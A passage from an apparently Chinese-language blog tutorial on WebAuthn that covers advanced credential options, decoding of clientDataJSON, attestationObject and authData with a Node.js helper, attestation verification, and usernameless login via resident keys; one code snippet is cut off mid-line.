WebAuthn。在这一部分中，我们会详细讨论上文没有提到的一些概念和参数，并了解 WebAuthn 中各类数据的结构以实现解码与验证。先来看一看一些进阶的选项吧。</p>\n<h2>进阶选项</h2>\n<p>没错，上文提到的传入 <code>navigator.credentials.create()</code> 和 <code>navigator.credentials.get()</code> 方法的参数其实只是所有参数的一部分。对于 <code>create()</code>，我们还可以配置这些可选内容（上文提及的已省略）：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">navigator.credentials.create({\r\n    publicKey: {\r\n        rp: {\r\n            icon\r\n        },\r\n        user: {\r\n            icon\r\n        },\r\n        attestation,\r\n        authenticatorSelection: {\r\n            requireResidentKey\r\n        },\r\n        extensions\r\n    }\r\n})</pre>\n</pre>\n<ul>\n<li>\n<code>rp.icon: String</code> 和 <code>user.icon</code>：是的，你可以为依赖方和用户设置图标，可以使用 HTTPS URL 或 Base64，一般长度不能超过 128 字节，不过大部分浏览器不会显示图标，或是有非常小的图片体积限制，所以一般没有使用这一属性的必要</li>\n<li>\n<code>attestation: String</code>：表明依赖方是否需要证明。可选三个值：\n<ul>\n<li>\n<code>none</code>：（默认）不需要证明。如上文所述，依赖方不关心证明，因此认证器不会签名。对于 iOS/iPad OS 13，必须设置为此值，否则验证将失败</li>\n<li>\n<code>indirect</code>：依赖方需要证明，但证明方式可由认证器选择。在支持匿名证明的认证器上，认证器会通过匿名证明的方式签名挑战，并向依赖方提供签名方式等信息</li>\n<li>\n<code>direct</code>：依赖方要求直接证明。此时认证器会使用烧录在认证器中的公钥进行签名，同时向依赖方提供签名方式等信息以供依赖方验证认证器是否可信。更多信息可以阅读“<a href=\"https://flyhigher.top/#verify-authenticator\">验证认证器</a>”一节</li>\n</ul>\n</li>\n<li>在 <code>authenticatorSelection</code> 中，我们还可以设置两个可选属性：\n<ul>\n<li>\n<code>authenticatorSelection.requireResidentKey: Boolean</code>：是否要求将私钥钥永久存储于认证器中。默认值为 <code>false</code>。对于 iOS/iPad OS 13，必须设置为 <code>false</code>，否则验证将失败</li>\n</ul>\n</li>\n</ul>\n<li>\n<code>extensions: Object</code>：WebAuthn 扩展，可以提供规范之外的配置和响应。由于实际情况中很少会使用这一特性，我们不会在这篇文章中讨论它</li>\n\n<blockquote><p>将 <code>requireResidentKey</code> 设置为 <code>true</code> 可以实现无用户名的登录，即认证器同时替代了用户名和密码。需要注意的是，尽管大部分认证器可以实现无限对公私钥，<strong>但能永久存储的私钥数量是有限的</strong>（对于 Yubikey，这通常是 25），因此只应在真正需要的时候启用此特性。我们会在“<a href=\"https://flyhigher.top/#login-without-username\">无用户名登录</a>”一节中详细讨论原因。</p></blockquote>\n<blockquote><p><strong>如果你没有高安全需求（如银行交易等），请不要向认证器索取证明</strong>，即将 <code>attestation</code> 设置为 \"none\"。对于普通身份认证来说，要求证明不必要的，且会有浏览器提示打扰到用户。</p></blockquote>\n<blockquote><p>Android 暂时无法实施用户验证，进而会导致依赖方验证失败。你可以在<a href=\"https://bugs.chromium.org/p/chromium/issues/detail?id=997538\">这里</a>追踪这个特性的实现情况。</p></blockquote>\n<blockquote>\n<p>对于 <code>extensions</code>，由于目前浏览器支持和应用范围有限，我们不会在这篇文章中涉及，不过你可以看一个例子：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">extensions: {\r\n    uvm: true, // 要求认证器返回用户进行验证的方法\r\n    txAuthSimple: \"Please proceed\" // 在认证器上显示与交易有关的简短消息\r\n}</pre>\n<p>你可以在<a href=\"https://www.w3.org/2019/01/webauthn-extensions.html\">这个页面</a>了解更多关于 <code>extensions</code> 的信息。</p>\n</blockquote>\n<p>对于 <code>get()</code>，我们其实只有一个可选内容没讲了，即 <code>extensions</code>。和上文一样，我们不会在这篇文章中讨论它。</p>\n<p>就这些了！<span></span></p>\n<h2>手动解个码</h2>\n<p>是时候看看如何手动解码了。我们将会在这一节中讨论认证器返回的数据的结构以及如何正确地解码它们。</p>\n<p>首先我们来看看如何处理注册过程中认证器发回的数据。假设所有 <code>ArrayBuffer</code> 类型的值都被正确地以 Base64 编码，且后端已经将 JSON 的字符串解析为字典。先来复习一下，我们得到的数据应该是这样的（数据较长，已省略一部分）：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    id: \"ZRBkDBCEtq...9XY8atOcbg\",\r\n    type: \"public-key\",\r\n    rawId: \"ZRBkDBCEtq...9XY8atOcbg==\",\r\n    response: {\r\n        clientDataJSON: \"eyJjaGFsbGVuZ2U...i5jcmVhdGUifQ==\",\r\n        attestationObject: \"o2NmbXRkbm9uZWd...xNHuAMzz2LxZA==\"\r\n    }\r\n}</pre>\n<p>这里的 <code>id</code> 就是凭证的 ID，如果验证正确，我们最终要将它存储起来并于用户关联。同时可以看到 Base64 编码后的 <code>rawId</code> 其实和 <code>id</code> 是一致的（不过 <code>id</code> 是 Base64URL 编码的）。而 <code>type</code> 则一定是 \"public-key\"。</p>\n<p>不过，我们主要关心的还是 <code>respose</code> 中的两项内容。首先是 <code>clientDataJSON</code>。它的处理比较简单，看名字就知道，它应该是一个 JSON 字符串。</p>\n<blockquote><p>小技巧：如果你看到一个 Base64 编码的字符串以 \"ey\" 开头，那么它大概率是一个 Base64 编码的 JSON。</p></blockquote>\n<p>将<code>clientDataJSON</code> Base64 解码再 JSON 解码之后我们就能得到一个字典：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    challenge: \"NI4i1vsNmP2KHcmyFnBCKRVQPfHgg34SsYZUOPZY2lM\",\r\n    extra_keys_may_be_added_here: \"do not compare clientDataJSON against a template. See https://goo.gl/yabPex\",\r\n    origin: \"https://dev.axton.cc\",\r\n    type: \"webauthn.create\"\r\n}</pre>\n<p>结构一目了然。在这里，我们需要验证三项内容：</p>\n<ul>\n<li>\n<code>challenge</code> 和之前发送的一致</li>\n<li>\n<code>origin</code> 为创建凭证的页面的源（协议+主机名+端口号，并非 URL）</li>\n<li>\n<code>type</code> 为 \"webauthn.create\"</li>\n</ul>\n<p>同时可以注意到有一个奇怪的 <code>extra_keys_may_be_added_here</code>。这其实是 Google 在 Chrome 中搞的一点小把戏，有一定概率会出现，提醒我们需要将 JSON 解析后再验证键值以防额外插入的键值影响验证。具体信息你可以访问那个 URL 看一看。</p>\n<p>对于 Firefox，我们会多得到两项 <code>clientExtensions</code> 和 <code>hashAlgorithm</code> ，分别指明了客户端扩展数据和签名算法。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\" data-enlighter-highlight=\"3-4\">{\r\n    challenge: \"dg6ost6ujhAA0g6WqLe-SOOH-tbhvjW9Sp90aPKlLJI\",\r\n    clientExtensions: {},\r\n    hashAlgorithm: \"SHA-256\",\r\n    origin: \"https://dev.axton.cc\",\r\n    type: \"webauthn.create\"\r\n}</pre>\n<p>由于本文不考虑扩展数据，因此我们可以不考虑 <code>clientExtensions</code>。同时由于目前规范中指定的签名算法只有 SHA-256 一种，因此现阶段我们也可以简单地忽略 <code>hashAlgorithm</code>。</p>\n<p><code>clientDataJSON</code> 很简单地就处理完了。接下来我们要来看看 <code>attestationObject</code>。先来看看 <code>attestationObject</code> 的结构图示：</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s1-3.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s1-3.png\" alt=\"attestationObject 的结构\" width=\"1056\" height=\"532\" class=\"aligncenter size-full wp-image-2245\"></a>\n<p><code>attestationObject</code> 是 CBOR 编码后再被 Base64 编码的，因此我们需要额外对其进行 CBOR 解码。</p>\n<blockquote><p>CBOR (Concise Binary Object Representation, 简明二进制对象表示) 是一种多应用于物联网领域的编码方式，你可以将它看作体积更小、更方便物联网传输的二进制 JSON。大部分语言都可以找到对应的 CBOR 解码库。</p></blockquote>\n<p>我们当然不会手解 CBOR，直接来看看解开之后的样子吧：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    fmt: \"none\",\r\n    attStmt: {},\r\n    authData: [211, 217, 43, 24, 199, ..., 97, 238, 166, 67, 107]\r\n}</pre>\n<p>这些键值的含义如下：</p>\n<ul>\n<li>\n<code>fmt</code>：标明证明的格式。WebAuthn 预定义了几种格式，分别为：\n<ul>\n<li>\n<code>none</code>：没有证明</li>\n<li>\n<code>packed</code>：为 WebAuthn 优化的证明格式</li>\n<li>\n<code>android-safetynet</code>：Android 使用的格式</li>\n<li>\n<code>android-key</code>：又是 Android 使用的格式</li>\n<li>\n<code>fido-u2f</code>：FIDO U2F 认证器使用的格式</li>\n<li>\n<code>tpm</code>：TPM 可信平台模块使用的格式</li>\n</ul>\n</li>\n<li>\n<code>attStmt</code>：证明对象，具体格式根据 <code>fmt</code> 的不同会有所不同</li>\n<li>\n<code>authData</code>：包含公钥、签名计数等来自认证器的数据</li>\n</ul>\n<p>诶，例子里的 <code>attStmt</code> 怎么是空的？还记得之前说的吗？大部分情况下，<strong>如果依赖方不要求证明，那么认证器不会签名挑战</strong>，于是 <code>fmt</code> 会变为 \"none\"，<code>attstmt</code> 会为空。如果不是高安全要求，我们可以只对这一种情况做支持。</p>\n<blockquote><p>注意，部分情况下 Firefox 会在不要求证明（即 <code>attestation</code> 为 \"none\"）时会返回 <code>fmt</code> 为 \"packed\" 的证明。<strong>这是符合规范的。</strong>此时认证器会进行自证明，你可以视情况进行处理。具体可以阅读“<a href=\"https://flyhigher.top/#verify-authenticator\">验证认证器</a>”一节。</p></blockquote>\n<p>对于非 \"none\" 的 <code>fmt</code> 我们稍后再谈，现在我们先来看看 <code>authData</code>。来复习一下 <code>authData</code> 的结构：</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s2-3.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s2-3.png\" alt=\"authData 的结构\" width=\"1056\" height=\"384\" class=\"aligncenter size-full wp-image-2240\"></a>\n<p>对于它的解码比较简单粗暴，我们要做的就是根据图示将它切开，然后适当地转换类型。其中各部分的含义如下：</p>\n<ul>\n<li>\n<code>rpIdHash</code>：如其名，SHA-256 的 <code>rpId</code>，长度 32 字节</li>\n<li>\n<code>flags</code>：标识认证状态，长度 1 字节。其中 8 位分别为：\n<ul>\n<li>\n<code>ED</code>：是否有扩展数据</li>\n<li>\n<code>AT</code>：是否包含 <code>attestedCredentialData</code>。通常注册认证器时会包含 <code>attestedCredentialData</code>，而验证时不包含</li>\n<li>保留位</li>\n<li>保留位</li>\n<li>保留位</li>\n<li>\n<code>UV</code>：用户是否已验证</li>\n<li>保留位</li>\n<li>\n<code>UP</code>：用户是否在场</li>\n</ul>\n</li>\n<li>\n<code>signCount</code>：签名计数，长度 4 字节</li>\n<li>\n<code>attestedCredentialData</code>：包含公钥等凭据数据，变长。其结构如下：\n<ul>\n<li>\n<code>aaguid</code>：认证器的 AAGUID (Authenticator Attestation GUID)，对于同一型号的认证器，它们的 AAGUID 是相同的</li>\n<li>\n<code>credentialIdLength</code>：标识 <code>credentialId</code> 的长度，长度 2 字节</li>\n<li>\n<code>credentialId</code>：凭证 ID，和 <code>rawId</code> 一致，长度由 <code>credentialIdLength</code> 定义</li>\n<li>\n<code>credentialPublicKey</code>：CBOR 编码的 COSE 格式的凭证公钥，变长</li>\n</ul>\n</li>\n<li>\n<code>extensions</code>：扩展数据，变长，本文不讨论</li>\n</ul>\n<blockquote><p>出于隐私考虑，如果不要求证明，认证器会以 0 填充 AAGUID。</p></blockquote>\n<p>如果你的后端在使用 Node.js，这里有个工具函数可以帮你完成这一步（不考虑 <code>extensions</code>）：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">function parseAuthData(buffer){\r\n    let rpIdHash = buffer.slice(0, 32);\r\n    buffer = buffer.slice(32);\r\n  \r\n    let flagsBuf = buffer.slice(0, 1);\r\n    buffer = buffer.slice(1);\r\n\r\n    let flagsInt = flagsBuf[0];\r\n    let flags = {\r\n        up: !!(flagsInt &amp; 0x01),\r\n        uv: !!(flagsInt &amp; 0x04),\r\n        at: !!(flagsInt &amp; 0x40),\r\n        ed: !!(flagsInt &amp; 0x80),\r\n        flagsInt\r\n    }\r\n\r\n    let counterBuf = buffer.slice(0, 4);\r\n    buffer = buffer.slice(4);\r\n  \r\n    let counter = counterBuf.readUInt32BE(0);\r\n\r\n    let aaguid = undefined;\r\n    let credID = undefined;\r\n    let COSEPublicKey = undefined;\r\n\r\n    if(flags.at) {\r\n        aaguid = buffer.slice(0, 16);\r\n        buffer = buffer.slice(16);\r\n\r\n        let credIDLenBuf = buffer.slice(0, 2);\r\n        buffer = buffer.slice(2);\r\n\r\n        let credIDLen = credIDLenBuf.readUInt16BE(0);\r\n        credID = buffer.slice(0, credIDLen);\r\n\r\n        buffer = buffer.slice(credIDLen);\r\n        COSEPublicKey = buffer;\r\n    }\r\n\r\n    return {rpIdHash, flagsBuf, flags, counter, counterBuf, aaguid, credID, COSEPublicKey}\r\n}</pre>\n<p>这段代码来自 <a href=\"https://gist.github.com/herrjemand/dbeb2c2b76362052e5268224660b6fbc\">herrjemand</a></p>\n<p>解开后，依赖方至少需要做四件事情：</p>\n<ol>\n<li>验证 <code>rpIdHash</code> 和预期的一致</li>\n<li>按预期检查用户在场和用户验证状态</li>\n<li>存储签名计数</li>\n<li>存储公钥</li>\n</ol>\n<blockquote><p>签名计数不一定从 0 开始。</p></blockquote>\n<p>对于公钥，也就是 <code>credentialPublicKey</code>，我们需要多一次 CBOR 解码，然后就可以得到类似这样的公钥：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    kty: \"EC\",\r\n    alg: \"ECDSA_w_SHA256\",\r\n    crv: \"P-256\",\r\n    x: \"ZGQALNfqo0L7HFYQHFHCS/X5db49z0ePnuQEs3w3X8w=\",\r\n    y: \"6qYxhnjYuez/Q8N6vX7nIIGfxFWdZ25NzQfZYuYOalA=\"\r\n}</pre>\n<p>然后可以选择适当的方法将其存储起来，之后的步骤本文就不再赘述了。现在，将目光拉回来，让我们看看包含证明的 <code>attestationObject</code> 是怎么样的。我们来看一个例子：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    fmt: \"packed\",\r\n    attStmt: {\r\n        alg: -7,\r\n        sig: [48, 70, 2, 33, 0, ..., 132, 78, 46, 100, 21],\r\n        x5c: [\r\n            [48, 130, 2, 189, 48, 130, 1, 165, 160, 3, ..., 177, 48, 125, 191, 145, 24, 225, 169, 41, 248]\r\n        ]\r\n    },\r\n    authData: [211, 217, 43, 24, 199, ..., 158, 54, 87, 126, 54]\r\n}</pre>\n<p>这里有一个使用 \"packed\" 格式的证明。此时，<code>attStmt</code> 中包含三个值：</p>\n<ul>\n<li>\n<code>alg</code>：签名算法</li>\n<li>\n<code>sig</code>：签名值</li>\n<li>\n<code>x5c</code>：X.509 编码的证书链</li>\n</ul>\n<p>我们不会在这一节中详述对签名的验证。要了解更多信息，你可以阅读“<a href=\"https://flyhigher.top/#verify-authenticator\">验证认证器</a>”一节。现在，让我们来看看如何处理验证过程中认证器发回的数据。我们得到的数据应该是这样的（数据较长，已省略一部分）：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    id: \"hmqdxPLit9...BWeVxZqdvU\",\r\n    type: \"public-key\",\r\n    rawId: \"hmqdxPLit9V...BWeVxZqdvU=\",\r\n    response: {\r\n        authenticatorData: \"09krGMcWTf...UFAAAABA==\",\r\n        clientDataJSON: \"eyJjaGFsbGVuZ2U...XRobi5nZXQifQ==\",\r\n        signature: \"UsXZV3pvT3np8btj6V0g...WBkaqyt88DrD40qh+A==\",\r\n        userHandle: \"MmYxNWYzZjQyZjM...Tg2ZDY4NzhlNw==\"\r\n    }\r\n}</pre>\n<p><code>id</code>, <code>rawId</code> 和 <code>type</code> 和之前一样，这里就不再赘述了。让我们来看看 <code>response</code>。首先是 <code>clientDataJSON</code>，和之前的解法一样，要验证的内容也一样，只是 <code>type</code> 从 \"webauthn.create\" 变成了 \"webauthn.get\"。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    challenge: \"bnkd2CmrEuvKnAFXs2QlC3SKlg4XFvGtP4HJL1yEWyU\",\r\n    origin: \"https://dev.axton.cc\",\r\n    type: \"webauthn.get\"\r\n}</pre>\n<p>然后是 <code>userHandle</code>。前面讲过，这是认证器在创建凭证时的用户 ID。如果用户在使用 U2F 认证器，很可能这一项为空，所以大部分情况下我们不关心这一项。</p>\n<p>接着来看 <code>authenticatorData</code>。这其实就是之前的 <code>attestedCredentialData</code>，只是这次不包含公钥。以相同的方式切开数据，我们应该可以得到 <code>rpIdHash</code>, <code>flags</code>和 <code>signCount</code> 三项。此时，依赖方至少需要做这三样事情：</p>\n<ol>\n<li>验证 <code>rpIdHash</code> 和预期的一致</li>\n<li>按预期检查用户在场和用户验证状态</li>\n<li>验证签名计数大于之前存储的计数，并更新存储的计数</li>\n</ol>\n<blockquote><p>如果签名计数比之前的小，那么这个认证器很可能是伪造的，应该中止验证并返回验证失败。同时，签名计数不一定每次按 1 递增，通常只要计数比此前的大就认为计数检查通过。</p></blockquote>\n<p>最后，我们来看 <code>signature</code>，也就是签名。不过这个签名不是简单的对挑战的签名，具体算法如图所示：</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s3-2.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s3-2.png\" alt=\"签名过程\" width=\"1034\" height=\"587\" class=\"aligncenter size-full wp-image-2231\"></a>\n<p>计算签名时，认证器会将 <code>authenticatorData</code> 与 <code>clientDataHash</code>（也就是 <code>clientDataJSON</code> 的 SHA-256 Hash）拼接起来，并使用对应的私钥签名。依赖方应该使用对应的公钥将其解密，并验证内容是否是 <code>authenticatorData</code> 与 <code>clientDataHash</code> 的拼接。这部分的计算不在本文的讨论范围内。</p>\n<p>最后，如果全部验证通过，返回验证成功。<span></span></p>\n<h2>验证认证器</h2>\n<p>WebAuthn 已经很安全了，但有的时候我们还要让它更安全一点。比如，如果用户在使用伪造的或是自制的认证器，认证器的安全性就得不到保证。此时，依赖方就需要验证认证器是否是可信的认证器。</p>\n<blockquote><p>这一过程仅发生在注册认证器时。此时，如果认证器验证通过，就可以存储公钥，后续步骤和之前描述的一致。</p></blockquote>\n<blockquote><p>再次说明，如果不是对安全性有极高的要求，向认证器索取证明以验证认证器是否可信是没有必要的。此外，验证认证器需要依赖方自行维护可信认证器列表，大大增加了维护的复杂性。</p></blockquote>\n<p>在调用 <code>navigator.credentials.create()</code> 时，我们可以将 <code>attestation</code> 设置为非 \"none\" 来向认证器索取证明。除无证明外，WebAuthn 定义了四种证明方式：</p>\n<ul>\n<li>Basic Attestation (Basic) ：基础的证明方式，认证器会使用认证器私钥签名</li>\n<li>Self Attestation (Self) ：自证明，认证器会使用凭证私钥签名</li>\n<li>Attestation CA (AttCA) ：认证器会使用多个证明私钥之一签名</li>\n<li>Elliptic Curve based Direct Anonymous Attestation (ECDAA) ：通过 <a href=\"https://en.wikipedia.org/wiki/Direct_Anonymous_Attestation\">DAA</a> 实现的匿名证明</li>\n</ul>\n<blockquote><p>和验证过程一样，这里签名的目标是 <code>authenticatorData</code> 和 <code>clientDataHash</code> 的连接。</p></blockquote>\n<p>还记得 <code>create()</code> 时 <code>attestation</code> 可选的三个值吗？这个值会决定认证器最终使用哪种方式进行证明。复习一下：</p>\n<ul>\n<li>\n<code>none</code>：大部分情况下认证器会选择不进行证明，部分认证器会进行自证明。此时 AAGUID 会被 0 填充</li>\n<li>\n<code>indirect</code>：认证器会试图通过替换 AAGUID 和选择合适的证明方式来进行匿名证明，具体方式由认证器选择</li>\n<li>\n<code>direct</code>：认证器会提供最直接的证明信息</li>\n</ul>\n<p>注意，大部分情况下，当认证器需要向依赖方证明自己可信时需要提供认证器公钥，<strong>这会触发浏览器提示，只有用户同意后认证器才会进行证明，否则认证器将不提供证明。</strong></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/5.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/5.png\" alt=\"浏览器提示\" width=\"446\" height=\"283\" class=\"aligncenter size-full wp-image-2217\"></a>\n<blockquote><p>为什么浏览器会说“安全密钥的品牌和型号”？事实上，为了避免用户通过认证器证书被跨依赖方追踪，FIDO 要求使用相同认证器证书的认证器的数量不能少于 100,000。于是大部分认证器厂商会选择<strong>让同一型号的认证器共用同一份证书。</strong>因此，浏览器的会询问用户是否同意“查看安全密钥的品牌和型号”。</p></blockquote>\n<blockquote><p>Android Safety Net 不会向用户询问是否同意，而是会静默进行证明。</p></blockquote>\n<p>当证明不为空时，依赖方收到数据后根据 <code>attestationObject.fmt</code> 的不同，需要选择不同的验证方式来验证认证器的可信情况。出于篇幅原因，这里我们不会讨论每一种 <code>fmt</code> 的验证方式，更多信息你可以查阅 <a href=\"https://www.w3.org/TR/webauthn/#defined-attestation-formats\">W3C 文档</a>。</p>\n<p>当 <code>fmt</code> 为 <code>packed</code> 时，<code>attestationObject.attStmt</code> 可能会有三种格式：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">// 自证明\r\n{\r\n    alg, // 算法\r\n    sig // 签名\r\n}\r\n// 基础或证明 CA 证明\r\n{\r\n    alg,\r\n    sig,\r\n    x5c // X.509 证书链\r\n}\r\n// 椭圆曲线证明\r\n{\r\n    alg,\r\n    sig,\r\n    ecdaaKeyId // ECDAA-Issuer 公钥标识符\r\n}</pre>\n<p>此时，依赖方需要检查证书符合预期格式并检查证书是否在可信链上。首先，如果证明中既没有 <code>ecdaaKeyId</code> 也没有 <code>x5c</code>，就说明这个证明使用的是自证明，只需使用认证器提供的公钥验证即可；如果有 <code>x5c</code>，那么就需要验证 <code>x5c</code> 中的证书是否在可信链上。将 <code>x5c</code> 中的每个证书以 Base64 编码，按 64 个字符切开，并在头尾加上 <code>-----BEGIN CERTIFICATE-----</code> 和 <code>-----END CERTIFICATE-----</code>就能得到一个证书字符串了。之后，依赖方需要验证证书是否可信。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">function base64ToPem(b64cert){\r\n    let pemcert = '';\r\n    for(let i = 0; i \n<p>这段代码来自 <a href=\"https://gist.github.com/herrjemand/dbeb2c2b76362052e5268224660b6fbc\">herrjemand</a></p>\n<p>至于 <code>ecdaaKeyId</code>，由于目前应用较少，处理方法可能需要你另寻资料了。检查证书的具体步骤已经超出了本文的范围，具体可以查阅<a href=\"https://medium.com/@herrjemand/verifying-fido2-packed-attestation-a067a9b2facd\">这篇文章</a>（英文）。</p>\n<blockquote><p>你可以在 <a href=\"https://fidoalliance.org/metadata/\">FIDO Metadata Service</a> 找到各大厂商认证器的可信证书链。</p></blockquote>\n<p>当在 Android 上调起 WebAuthn 时，大部分情况下 <code>fmt</code> 将会为 <code>safety-net</code>。此时 <code>attestationObject.attStmt</code> 的结构会是：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    ver: \"200616037\",\r\n    response: {\r\n        type: \"Buffer\",\r\n        data: [101, 121, 74, 104, 98, ..., 115, 104, 104, 82, 65]\r\n    }\r\n}</pre>\n<p>此时，<code>clientDataJSON</code> 中还会出现 <code>androidPackageName</code> 键，值是调起 WebAuthn 验证的应用的包名，如 Chrome 就是 \"com.android.chrome\"。</p>\n<p>在这个证明中，<code>data</code> 其实是一个 JWT 字符串，我们可以将它编码为字符串并将其按照 JWT 进行解码（别忘了验证 JWT 签名）。最终我们会得到一个类似这样的 Payload：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    nonce: \"0QAurN4F9wik6GEkblDJhGuf4kuaqZn5zaaxlvD1hlA=\",\r\n    timestampMs: 1584950686460,\r\n    apkPackageName: \"com.google.android.gms\",\r\n    apkDigestSha256: \"2BQHno+bmWWwdLUYylS8HLt5ESJzci3nt2uui71ojyE=\",\r\n    ctsProfileMatch: true,\r\n    apkCertificateDigestSha256: [\r\n        \"8P1sW0EPicslw7UzRsiXL64w+O50Ed+RBICtay2g24M=\"\r\n    ],\r\n    basicIntegrity: true,\r\n    evaluationType: \"BASIC\"\r\n}</pre>\n<p>其中包含了有关设备状态的一些信息。比如说，如果 <code>ctsProfileMatch</code> 为 <code>false</code>，那么该设备很有可能被 root 了。对于高安全要求的场景，我们可以视情况进行验证。</p>\n<p>同时我们可以在 JWT Header 中验证证明的有效性。我们应该能取得这样的 Header：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    alg: \"RS256\",\r\n    x5c: [\r\n        \"MIIFkzCCBHugAwIBAgIR...uvlyjOwAzXuMu7M+PWRc\",\r\n        \"MIIESjCCAzKgAwIBAgIN...UK4v4ZUN80atnZz1yg==\"\r\n    ]\r\n}</pre>\n<p>这里的结构就和上方的 <code>x5c</code> 验证类似了。具体步骤可以参考<a href=\"https://medium.com/@herrjemand/verifying-fido2-safetynet-attestation-bd261ce1978d\">这篇文章</a>（英文）。</p>\n<p>其他所有格式的验证方式也都可以在<a href=\"https://medium.com/@herrjemand/verifying-fido2-responses-4691288c8770\">这篇文章</a>（英文）中找到。<span></span></p>\n<h2>无用户名登录</h2>\n<p>认证器已经代替了密码，可是这还不够！在进行第一因素认证（即使用 WebAuthn 登录）时，我们还是需要输入用户名，然后才能进行身份认证。懒惰是第一生产力，我们能不能不输入用户名就进行身份认证呢？实际上，大部分认证器都允许我们无用户名登录。<strong>而这一特性的核心就是 Resident Key 客户端密钥驻留。</strong></p>\n<p>你可以思考一下，为什么普通的 WebAuthn 为什么不能实现无用户名登录？事实上，大部分认证器为了实现无限对公私钥，会将私钥通过 Key Warp 等技术加密后包含在凭证 ID 中发送给依赖方，这样认证器本身就不用存储任何信息。不过，这就导致需要身份认证时，依赖方必须通过用户名找到对应的凭证 ID，将其发送给认证器以供其算出私钥。</p>\n<blockquote><p>Yubikey 实现了一个基于 HMAC 的算法，认证器可以在私钥不离开认证器的前提下（常规的 Key Warp 算法中实际上私钥离开了认证器）通过一些输入和凭证 ID 重新计算私钥，你可以阅读<a href=\"https://www.yubico.com/blog/yubicos-u2f-key-wrapping/\">这篇文章</a>了解更多。</p></blockquote>\n<blockquote><p>客户端通过凭证 ID 查找对应认证器的算法根据系统的不同是不同的。通常凭证 ID 中会包含认证器信息，因此系统可以通过凭证 ID 找到对应的认证器。</p></blockquote>\n<p>要避免输入用户名，我们可以要求认证器将私钥在自己的内存中也存储一份。这样，依赖方无需提供凭证 ID，认证器就可以通过依赖方 ID 找到所需的私钥并签名公钥。以下是具体流程：</p>\n<p>注册时：</p>\n<ol>\n<li>依赖方请求新建凭证，同时要求启用客户端密钥</li>\n<li>认证器生成一对公私钥，并将私钥存储在永久内存中且与依赖方 ID 及用户 ID 绑定，随后将公钥发送给依赖方以供存储</li>\n<li>依赖方将用户 ID 即公钥与用户绑定</li>\n</ol><p>验证时：</p>\n<ol>\n<li>依赖方请求验证，但不必提供除依赖方 ID 以外的更多信息</li>\n<li>用户选择认证器</li>\n<li>认证器根据依赖方 ID 找到对应私钥</li>\n<li>如果有多个对应私钥，认证器会询问用户应该使用哪个身份信息登录</li>\n<li>确定私钥后，认证器签名挑战并将其返回，同时返回用户 ID</li>\n<li>依赖方通过用户 ID 找到对应用户并用对应公钥检查签名，正确则允许对应用户登录</li>\n</ol><blockquote><p>可以看到，这个特性同时要求认证器存储用户 ID，即上面提到过的 <code>userHandle</code>。依赖方需要根据此信息找到对应用户，因此不支持 <code>userHandle</code> 的 U2F 认证器无法进行无用户名登录。</p></blockquote>\n<blockquote><p>如之前所说，<strong>认证器能永久存储的私钥数量是有限的</strong>，因此只应在真正需要无用户名登录的时候启用此特性。</p></blockquote>\n<blockquote><p>目前暂时没有办法检测认证器是否支持客户端密钥驻留，因此在无用户名验证失败时应 fallback 至常规的 WebAuthn 验证，即向用户询问用户名。</p></blockquote>\n<p>现在让我们来看看如何实现这一特性吧。首先，调用 <code>navigator.credentials.create()</code> 时我们需要注意两个参数：<code>requireResidentKey</code> 必须为 <code>true</code>，<code>userVerification</code> 必须为 \"required\"。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\" data-enlighter-highlight=\"5-6\">navigator.credentials.create({\r\n    publicKey: {\r\n        ...\r\n        authenticatorSelection: {\r\n            requireResidentKey: true,\r\n            userVerification: \"required\"\r\n            ...\r\n        },\r\n        ...\r\n    }\r\n})</pre>\n<blockquote><p>Windows Hello <strong>似乎</strong>会存储所有已注册的凭据，因此无论是否指定 <code>requireResidentKey</code>，你都可以通过 Windows Hello 进行无用户名登录。</p></blockquote>\n<p>随后，浏览器会询问用户是否允许认证器存储私钥。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/3.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/3.png\" alt=\"浏览器提示\" width=\"445\" height=\"285\" class=\"aligncenter size-full wp-image-2208\"></a>\n<p>如果用户同意，认证器会存储私钥，并和普通的 WebAuthn 一样返回信息。不过，依赖方收到数据之后，只需将公钥、用户 ID 与用户关联起来，而不必再将凭证 ID 与用户关联起来。至此注册完成。</p>\n<p>之后，在用户请求登录时，无需再向依赖方提供用户名。同时在传入 <code>navigator.credentials.get()</code> 的参数中也有两个需要注意：<code>userVerification</code> 必须为 \"required\"，同时 <code>allowCredentials</code> 必须为空。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\" data-enlighter-highlight=\"4-5\">navigator.credentials.get({\r\n    publicKey: {\r\n        ...\r\n        userVerification: 